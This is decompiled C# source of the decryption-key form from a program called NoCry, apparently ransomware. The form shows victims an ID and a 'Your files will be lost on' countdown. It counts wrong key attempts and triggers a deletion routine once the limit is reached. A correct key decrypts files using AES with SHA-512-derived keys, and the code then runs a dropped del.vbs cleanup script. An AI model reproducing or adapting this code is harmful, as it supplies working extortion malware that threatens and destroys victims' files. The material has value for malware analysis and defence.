using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NoCry.My;
using NoCry.My.Resources;

namespace NoCry;

[DesignerGenerated]
public class Form2 : Form
{
	private enum CryptoAction
	{
		ActionDecrypt = 2
	}

	private IContainer components;

	private FileStream fsInput;

	private FileStream fsOutput;

	private byte[] bytKey;

	private byte[] bytIV;

	private object cntAttempts;

	private object h;

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker BackgroundWorker1
	{
		[CompilerGenerated]
		get
		{
			return _BackgroundWorker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = BackgroundWorker1_DoWork;
			BackgroundWorker backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_BackgroundWorker1 = value;
			backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label10")]
	internal virtual Label Label10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button2_Click;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public Form2()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form2_Load);
		cntAttempts = 0;
		h = Interaction.GetSetting("T", "0", St.Setting, "");
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_023c: Expected O, but got Unknown
		//IL_0516: Unknown result type (might be due to invalid IL or missing references)
		//IL_0520: Expected O, but got Unknown
		TextBox1 = new TextBox();
		Label6 = new Label();
		Button1 = new Button();
		Label1 = new Label();
		BackgroundWorker1 = new BackgroundWorker();
		Panel1 = new Panel();
		Label10 = new Label();
		ProgressBar1 = new ProgressBar();
		Label2 = new Label();
		PictureBox1 = new PictureBox();
		Label3 = new Label();
		TextBox2 = new TextBox();
		Button2 = new Button();
		((Control)Panel1).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)TextBox1).set_Location(new Point(58, 49));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(318, 20));
		((Control)TextBox1).set_TabIndex(0);
		Label6.set_AutoSize(true);
		((Control)Label6).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		((Control)Label6).set_Location(new Point(12, 50));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(40, 16));
		((Control)Label6).set_TabIndex(10);
		Label6.set_Text("key :");
		((ButtonBase)Button1).set_BackColor(Color.White);
		((Control)Button1).set_Cursor(Cursors.get_Hand());
		((Control)Button1).set_ForeColor(Color.Black);
		((Control)Button1).set_Location(new Point(3, 63));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(130, 26));
		((Control)Button1).set_TabIndex(11);
		((ButtonBase)Button1).set_Text("Decrypt");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Tahoma", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.White);
		((Control)Label1).set_Location(new Point(12, 187));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(19, 13));
		((Control)Label1).set_TabIndex(12);
		Label1.set_Text("...");
		((Control)Panel1).set_BackColor(Color.Maroon);
		Panel1.set_BorderStyle((BorderStyle)2);
		((Control)Panel1).get_Controls().Add((Control)(object)Label10);
		((Control)Panel1).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)Panel1).get_Controls().Add((Control)(object)Button1);
		((Control)Panel1).get_Controls().Add((Control)(object)Label2);
		((Control)Panel1).set_ForeColor(Color.White);
		((Control)Panel1).set_Location(new Point(236, 75));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(140, 98));
		((Control)Panel1).set_TabIndex(13);
		Label10.set_AutoSize(true);
		((Control)Label10).set_ForeColor(Color.White);
		((Control)Label10).set_Location(new Point(3, 4));
		((Control)Label10).set_Name("Label10");
		((Control)Label10).set_Size(new Size(122, 13));
		((Control)Label10).set_TabIndex(15);
		Label10.set_Text("Your files will be lost on :");
		((Control)ProgressBar1).set_Location(new Point(3, 45));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(130, 12));
		((Control)ProgressBar1).set_TabIndex(5);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Location(new Point(3, 29));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(16, 13));
		((Control)Label2).set_TabIndex(3);
		Label2.set_Text("...");
		PictureBox1.set_Image((Image)(object)Resources.key);
		((Control)PictureBox1).set_Location(new Point(58, 92));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(139, 74));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(14);
		PictureBox1.set_TabStop(false);
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.White);
		((Control)Label3).set_Location(new Point(21, 23));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(31, 16));
		((Control)Label3).set_TabIndex(16);
		Label3.set_Text("ID :");
		((Control)TextBox2).set_Location(new Point(58, 22));
		((Control)TextBox2).set_Name("TextBox2");
		((TextBoxBase)TextBox2).set_ReadOnly(true);
		((Control)TextBox2).set_Size(new Size(266, 20));
		((Control)TextBox2).set_TabIndex(15);
		((ButtonBase)Button2).set_BackColor(Color.White);
		((Control)Button2).set_Cursor(Cursors.get_Hand());
		((Control)Button2).set_ForeColor(Color.Black);
		((Control)Button2).set_Location(new Point(330, 20));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(46, 23));
		((Control)Button2).set_TabIndex(17);
		((ButtonBase)Button2).set_Text("Copy");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(388, 209));
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Decryption Key");
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3 && ((Operators.CompareString(Label1.get_Text(), "Please Wait...", false) == 0) | (Operators.CompareString(Label1.get_Text(), "Done!", false) == 0)))
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		try
		{
			ProgressBar1.set_Maximum(Conversions.ToInteger(St.Attempts));
			if (Operators.ConditionalCompareObjectEqual(h, (object)null, false))
			{
				Interaction.SaveSetting("T", "0", St.Setting, Conversions.ToString(cntAttempts));
				cntAttempts = Interaction.GetSetting("T", "0", St.Setting, "");
				Label2.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(cntAttempts, (object)"/"), (object)St.Attempts), (object)" Attempts")));
				ProgressBar1.set_Value(Conversions.ToInteger(cntAttempts));
			}
			else
			{
				cntAttempts = Interaction.GetSetting("T", "0", St.Setting, "");
				Label2.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(cntAttempts, (object)"/"), (object)St.Attempts), (object)" Attempts")));
				ProgressBar1.set_Value(Conversions.ToInteger(cntAttempts));
			}
			TextBox2.set_Text(St.hash);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		if (check.AES_Decrypt(Interaction.GetSetting("G", "0", St.Setting, ""), TextBox1.get_Text()))
		{
			Label1.set_Text("Please Wait...");
			MyProject.Forms.Form1.Timer1.Stop();
			bytKey = CreateKey(TextBox1.get_Text());
			bytIV = CreateIV(TextBox1.get_Text());
			((Control)Button1).set_Enabled(false);
			((Control)TextBox1).set_Enabled(false);
			BackgroundWorker1.WorkerReportsProgress = true;
			BackgroundWorker1.WorkerSupportsCancellation = true;
			BackgroundWorker1.RunWorkerAsync();
			return;
		}
		Interaction.MsgBox((object)"Incorrect Key", (MsgBoxStyle)16, (object)null);
		((TextBoxBase)TextBox1).Clear();
		if (Operators.ConditionalCompareObjectEqual(cntAttempts, (object)St.Attempts, false))
		{
			((Control)this).Hide();
			((Control)Button1).set_Enabled(false);
			((Control)TextBox1).set_Enabled(false);
			Interaction.SaveSetting("D", "0", St.Setting, "OK");
			del.del();
		}
		else
		{
			ref object reference = ref cntAttempts;
			reference = Operators.AddObject(reference, (object)1);
			Label2.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(cntAttempts, (object)"/"), (object)St.Attempts), (object)" Attempts")));
			Interaction.SaveSetting("T", "0", St.Setting, Conversions.ToString(cntAttempts));
			ProgressBar1.Increment(1);
		}
	}

	private void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		long num5 = default(long);
		int num6 = default(int);
		CryptoStream cryptoStream = default(CryptoStream);
		byte[] buffer = default(byte[]);
		long length = default(long);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		FileInfo fileInfo = default(FileInfo);
		FileInfo fileInfo2 = default(FileInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 457:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_002a;
						case 5:
							goto IL_0040;
						case 6:
							goto IL_004d;
						case 7:
							goto IL_005a;
						case 8:
							goto IL_0069;
						case 9:
							goto IL_0072;
						case 11:
							goto IL_0080;
						case 15:
							goto IL_009d;
						case 16:
							goto IL_00b4;
						case 17:
							goto IL_00c2;
						case 10:
						case 12:
						case 13:
						case 14:
						case 18:
							goto IL_00cd;
						case 19:
							goto IL_00d8;
						case 20:
							goto IL_00e2;
						case 21:
							goto IL_00f0;
						case 22:
							goto IL_00fe;
						case 23:
							goto IL_0108;
						case 24:
							goto IL_0113;
						case 25:
						case 26:
							goto IL_011d;
						case 27:
							goto IL_0127;
						case 28:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 29:
						case 30:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00c2:
					num = 17;
					num5 = checked(num5 + num6);
					goto IL_00cd;
					IL_00b4:
					num = 16;
					cryptoStream.Write(buffer, 0, num6);
					goto IL_00c2;
					IL_000a:
					num = 2;
					fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
					goto IL_001a;
					IL_001a:
					num = 3;
					fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
					goto IL_002a;
					IL_002a:
					num = 4;
					fsOutput.SetLength(0L);
					goto IL_0040;
					IL_0040:
					num = 5;
					buffer = new byte[4097];
					goto IL_004d;
					IL_004d:
					num = 6;
					num5 = 0L;
					goto IL_005a;
					IL_005a:
					num = 7;
					length = fsInput.Length;
					goto IL_0069;
					IL_0069:
					num = 8;
					rijndaelManaged = new RijndaelManaged();
					goto IL_0072;
					IL_0072:
					num = 9;
					if (Direction == CryptoAction.ActionDecrypt)
					{
						goto IL_0080;
					}
					goto IL_00cd;
					IL_0080:
					num = 11;
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write);
					goto IL_00cd;
					IL_00cd:
					num = 14;
					if (num5 < length)
					{
						goto IL_009d;
					}
					goto IL_00d8;
					IL_00d8:
					num = 19;
					cryptoStream.Close();
					goto IL_00e2;
					IL_00e2:
					num = 20;
					fsInput.Close();
					goto IL_00f0;
					IL_00f0:
					num = 21;
					fsOutput.Close();
					goto IL_00fe;
					IL_00fe:
					num = 22;
					if (Direction == CryptoAction.ActionDecrypt)
					{
						goto IL_0108;
					}
					goto IL_011d;
					IL_0108:
					num = 23;
					fileInfo = new FileInfo(strInputFile);
					goto IL_0113;
					IL_0113:
					num = 24;
					fileInfo.Delete();
					goto IL_011d;
					IL_011d:
					num = 26;
					if (Direction != CryptoAction.ActionDecrypt)
					{
						goto end_IL_0001_3;
					}
					goto IL_0127;
					IL_0127:
					num = 27;
					fileInfo2 = new FileInfo(strInputFile);
					break;
					IL_009d:
					num = 15;
					num6 = fsInput.Read(buffer, 0, 4096);
					goto IL_00b4;
					end_IL_0001_2:
					break;
				}
				num = 28;
				fileInfo2.Delete();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 457;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	private byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		//IL_0223: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		string text2 = default(string);
		int num5 = default(int);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		string current = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 868:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_003d;
						case 6:
							goto IL_005d;
						case 7:
							goto IL_0068;
						case 8:
							goto IL_0090;
						case 9:
							goto IL_0096;
						case 10:
						case 11:
							goto IL_00af;
						case 12:
							goto IL_00b4;
						case 13:
							goto IL_00c4;
						case 14:
							goto IL_00d1;
						case 15:
							goto IL_00ed;
						case 16:
							goto IL_0109;
						case 17:
							goto IL_0125;
						case 18:
							goto IL_0141;
						case 19:
							goto IL_015d;
						case 20:
							goto IL_0179;
						case 21:
							goto IL_0195;
						case 22:
							goto IL_01b1;
						case 23:
							goto IL_01cd;
						case 24:
							goto IL_01e9;
						case 25:
							goto IL_01fc;
						case 26:
							goto IL_020b;
						case 27:
						case 28:
							goto IL_0218;
						case 29:
							goto IL_0229;
						case 30:
							goto IL_0233;
						case 31:
							goto IL_0247;
						case 32:
							goto IL_025d;
						case 33:
							goto IL_0288;
						case 34:
							goto IL_0295;
						case 35:
							goto IL_02a1;
						case 36:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 37:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0295:
					num = 34;
					streamWriter.WriteLine(text);
					goto IL_02a1;
					IL_0288:
					num = 33;
					streamWriter = new StreamWriter(text2, append: false);
					goto IL_0295;
					IL_000a:
					num = 2;
					((Control)Button1).set_Enabled(false);
					goto IL_0018;
					IL_0018:
					num = 3;
					num5 = Form4.listenc.Count;
					goto IL_0025;
					IL_0025:
					num = 4;
					((Form)this).set_Text("Decryption : Working * " + Conversions.ToString(num5));
					goto IL_003d;
					IL_003d:
					num = 5;
					enumerator = Form4.listenc.GetEnumerator();
					goto IL_004b;
					IL_004b:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						goto IL_005d;
					}
					goto IL_00b4;
					IL_02a1:
					num = 35;
					streamWriter.Close();
					break;
					IL_005d:
					num = 6;
					if (File.Exists(current))
					{
						goto IL_0068;
					}
					goto IL_00af;
					IL_0068:
					num = 7;
					EncryptOrDecryptFile(current, current.Replace(St.exs, ""), bytKey, bytIV, CryptoAction.ActionDecrypt);
					goto IL_0090;
					IL_0090:
					num = 8;
					num5 = checked(num5 - 1);
					goto IL_0096;
					IL_0096:
					num = 9;
					((Form)this).set_Text("Decryption : Working * " + Conversions.ToString(num5));
					goto IL_00af;
					IL_00af:
					num = 11;
					goto IL_004b;
					IL_00b4:
					num = 12;
					((IDisposable)enumerator).Dispose();
					goto IL_00c4;
					IL_00c4:
					num = 13;
					Form4.listenc.Clear();
					goto IL_00d1;
					IL_00d1:
					num = 14;
					Interaction.SaveSetting("P", "0", St.Setting, "");
					goto IL_00ed;
					IL_00ed:
					num = 15;
					Interaction.SaveSetting("H", "0", St.Setting, "");
					goto IL_0109;
					IL_0109:
					num = 16;
					Interaction.SaveSetting("M", "0", St.Setting, "");
					goto IL_0125;
					IL_0125:
					num = 17;
					Interaction.SaveSetting("S", "0", St.Setting, "");
					goto IL_0141;
					IL_0141:
					num = 18;
					Interaction.SaveSetting("X", "0", St.Setting, "");
					goto IL_015d;
					IL_015d:
					num = 19;
					Interaction.SaveSetting("D", "0", St.Setting, "");
					goto IL_0179;
					IL_0179:
					num = 20;
					Interaction.SaveSetting("T", "0", St.Setting, "");
					goto IL_0195;
					IL_0195:
					num = 21;
					Interaction.SaveSetting("G", "0", St.Setting, "");
					goto IL_01b1;
					IL_01b1:
					num = 22;
					Interaction.SaveSetting("F", "0", St.Setting, "");
					goto IL_01cd;
					IL_01cd:
					num = 23;
					Interaction.SaveSetting("C", "0", St.Setting, "");
					goto IL_01e9;
					IL_01e9:
					num = 24;
					Label1.set_Text("Done!");
					goto IL_01fc;
					IL_01fc:
					num = 25;
					if (File.Exists(St.html))
					{
						goto IL_020b;
					}
					goto IL_0218;
					IL_020b:
					num = 26;
					File.Delete(St.html);
					goto IL_0218;
					IL_0218:
					num = 28;
					Interaction.MsgBox((object)"Decryption completed successfully!", (MsgBoxStyle)64, (object)null);
					goto IL_0229;
					IL_0229:
					num = 29;
					text = Resources.del;
					goto IL_0233;
					IL_0233:
					num = 30;
					text2 = Path.GetTempPath() + "del.vbs";
					goto IL_0247;
					IL_0247:
					num = 31;
					text = text.Replace("%path%", Application.get_ExecutablePath());
					goto IL_025d;
					IL_025d:
					num = 32;
					text = text.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + St.mute + ".exe");
					goto IL_0288;
					end_IL_0001_2:
					break;
				}
				num = 36;
				Process.Start(text2);
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 868;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Clipboard.SetText(TextBox2.get_Text());
			MessageBox.Show("Copied To Clipboard");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}
}
